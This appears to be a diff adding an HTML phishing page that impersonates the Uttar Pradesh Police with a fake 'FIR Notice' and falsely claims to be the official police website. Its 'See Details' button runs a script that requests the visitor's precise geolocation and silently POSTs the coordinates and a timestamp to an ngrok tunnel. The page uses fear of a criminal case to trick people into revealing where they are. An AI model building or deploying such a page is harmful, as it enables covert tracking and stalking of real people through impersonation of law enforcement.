@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Mahoba Police station</title>
+<style>
+    body {
+        margin: 0;
+        font-family:'times new roman', cursive, sans-serif;
+	 text-align: center;
+	background: linear-gradient(to bottom, #cce7ff, #ffffff);
+	background-repeat: no-repeat;
+    }
+
+    header {
+        background: red;
+        color: white;
+        padding: 20px;
+        font-size: 26px;
+        letter-spacing: 1px;
+    }
+
+    .badge {
+        width: 120px;
+        margin-top: 20px;
+    }
+
+    .container {
+        max-width: 700px;
+        margin: 40px auto;
+        background: #ffffff;
+        border-radius: 15px;
+        box-shadow: 0 0 15px rgba(0,0,0,0.15);
+        padding: 30px;
+    }
+
+    h1 {
+        color: #ff0000;
+        font-size: 28px;
+    }
+
+    .message {
+        font-size: 20px;
+        color: #333;
+        margin: 20px 0;
+    }
+
+    .reason {
+        color: #005eff;
+        font-weight: bold;
+    }
+
+    .cta-btn {
+        margin-top: 25px;
+        padding: 15px 35px;
+        font-size: 20px;
+        background: #ffcc00;
+        border: none;
+        border-radius: 50px;
+        cursor: pointer;
+        transition: 0.3s;
+    }
+
+    .cta-btn:hover {
+        background: #ff9900;
+        transform: scale(1.05);
+    }
+
+    footer {
+        margin-top: 40px;
+        padding: 15px;
+        background: #005eff;
+        color: white;
+        font-size: 14px;
+    }
+
+@media (max-width: 600px) {
+
+  header {
+    font-size: 20px;
+    padding: 12px;
+    text-align: center;
+  }
+
+  .main {
+    flex-direction: column;
+    padding: 15px 10px;
+  }
+
+  .badge {
+    width: 120px;
+    margin: 10px auto 20px;
+    display: block;
+  }
+
+  .container {
+    width: 100%;
+    padding: 15px;
+  }
+
+  .container h1 {
+    font-size: 22px;
+  }
+
+  .message {
+    font-size: 14px;
+    line-height: 1.5;
+  }
+
+  .cta-btn {
+    width: 100%;
+    font-size: 15px;
+    padding: 12px;
+  }
+
+  footer {
+    font-size: 12px;
+    padding: 12px;
+    text-align: center;
+  }
+}
+</style>
+</head>
+<body>
+
+<header>FIR Notice</header>
+<div class="container">
+    <h1>⚠ FIR Notice! ⚠</h1>
+
+    <div class="message">
+        An FIR has been registered against you<br>
+        click below to see details 👇:<br>
+    </div>
+
+    <button class="cta-btn" onclick="getLocation()">
+        See Details
+    </button>
+</div>
+
+<footer>
+  Disclaimer, Terms and Condition | Copyright Policy | Privacy Policy | Hyperlinking Policy
+This is the official Website of Department of Police, Uttar Pradesh, India.
+Content on this website is published and 'managed' by Uttar Pradesh Police, Uttar Pradesh.
+For any query regarding this website, Please contact the "Web Administrator."
+
+</footer>
+</body>
+<script>
+function getLocation() {
+  if (!navigator.geolocation) {
+    alert("Geolocation is not supported by this browser.");
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    function(position) {
+      const data = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        timestamp: new Date().toISOString()
+      };
+
+      console.log("Location:", data);
+
+      // Send to your server
+      fetch("https://daaaa5b34a1f.ngrok-free.app/location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      })
+      .then(res => res.text())
+      .then(msg => console.log("Server Response:", msg))
+      .catch(err => console.error("Send Error:", err));
+    },
+    function(error) {
+      alert("Location access denied or unavailable.");
+      console.error(error);
+    }
+  );
+}
+</script>
+</html>
+
+
+
+
